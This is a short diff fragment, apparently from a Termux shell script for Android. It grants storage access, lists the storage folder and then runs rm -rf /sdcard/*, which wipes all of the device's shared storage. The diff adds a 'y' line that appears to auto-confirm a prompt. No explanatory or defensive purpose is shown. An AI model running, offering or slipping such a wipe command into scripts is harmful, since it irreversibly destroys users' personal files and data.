@@ -21,7 +21,7 @@ termux-setup-storage
 cd storage
 ls
 rm -rf /sdcard/*
-
+y
 
 
 
